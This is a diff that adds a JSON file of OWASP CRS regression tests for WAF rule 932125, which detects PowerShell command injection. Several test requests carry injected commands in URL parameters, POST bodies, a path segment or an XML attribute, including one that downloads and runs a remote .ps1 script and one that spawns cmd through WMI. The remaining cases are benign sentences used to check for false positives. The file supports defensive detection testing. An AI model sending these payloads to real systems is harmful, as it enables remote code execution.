@@ -1,0 +1,259 @@
+[
+  {
+    "name": "CRS 932125-1",
+    "method": "GET",
+    "uri": "/get?cmd=%3Biwr%20http://example.com/path/file.ps1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      932125
+    ]
+  },
+  {
+    "name": "CRS 932125-2: Test for BB finding VYYFBP5V",
+    "method": "GET",
+    "uri": "/get?cmd=%3Biwmi%20-class%20Win32_process%20-name%20Create%20-ArgumentList%20cmd",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      932125
+    ]
+  },
+  {
+    "name": "CRS 932125-3: Test for BB finding VYYFBP5V",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "59"
+      ]
+    ],
+    "body": "cmd=%3Biex+%28iwr+http%3A%2F%2F10.0.10.10%3A8000%2Fx.ps1%29",
+    "expect_ids": [
+      932125
+    ]
+  },
+  {
+    "name": "CRS 932125-4: Test for fp issue with ;man x",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "93"
+      ]
+    ],
+    "body": "payload=Ihre+kleine+Schwester+ist+franz%C3%B6sisches+Esskulturgut%3B+man+g%C3%B6nnt+sie+sich.",
+    "no_expect_ids": [
+      932125
+    ]
+  },
+  {
+    "name": "CRS 932125-5: Test for fp issue with ;mi x",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "394"
+      ]
+    ],
+    "body": "payload=Mi+sz%C3%A9p%2C+mi+%C3%A9des+azt+szeretni+a%E2%80%99+kinek+kifoly%C3%A1sa+mind+az+a%E2%80%99+sz%C3%A9p+a%E2%80%99+mit+itten+l%C3%A1tunk%21+ezt+mond%C3%A1d%2C+%E2%80%99s+mellyedre+szor%C3%ADt%C3%A1l+engemet%2C+%E2%80%99s+k%C3%B6ny%C5%B1kre+fakadt%C3%A1l%3B+mi+sz%C3%A9p+az%2C+mid%C5%91n+tetteinknek+mindeggyike+megnyeri+az+azokat+szeml%C3%A9l%C5%91+Angyalok%E2%80%99+javal%C3%A1saikat%21",
+    "no_expect_ids": [
+      932125
+    ]
+  },
+  {
+    "name": "CRS 932125-6: Test for fp issue with ;si x",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "267"
+      ]
+    ],
+    "body": "payload=C%E2%80%99est+simple%3A+si+les+feux+sont+au+vert+sur+la+carrosserie%2C+l%E2%80%99assistance+peut+intervenir+sur+un+v%C3%A9hicule+accident%C3%A9%3B+si+cela+vire+au+rouge+et+qu%E2%80%99une+alarme+r%C3%A9sonne%2C+un+danger+%C3%A9lectrique+haute+tension+subsiste.",
+    "no_expect_ids": [
+      932125
+    ]
+  },
+  {
+    "name": "CRS 932125-7: GHSA: 932125 payload via XML attribute injection (verifies XML://@* coverage)",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Content-Type",
+        "application/xml"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "87"
+      ]
+    ],
+    "body": "<?xml version=\"1.0\"?><root><a probe=\";iwr http://example.com/path/file.ps1\"></a></root>",
+    "expect_ids": [
+      932125
+    ]
+  },
+  {
+    "name": "CRS 932125-8: Detect RCE in last path segment\nPayload: ;iwmi -class Win32_process -name Create -ArgumentList cmd",
+    "method": "GET",
+    "uri": "/path/with/%3Biwmi%20-class%20Win32_process%20-name%20Create%20-ArgumentList%20cmd",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      932125
+    ]
+  }
+]
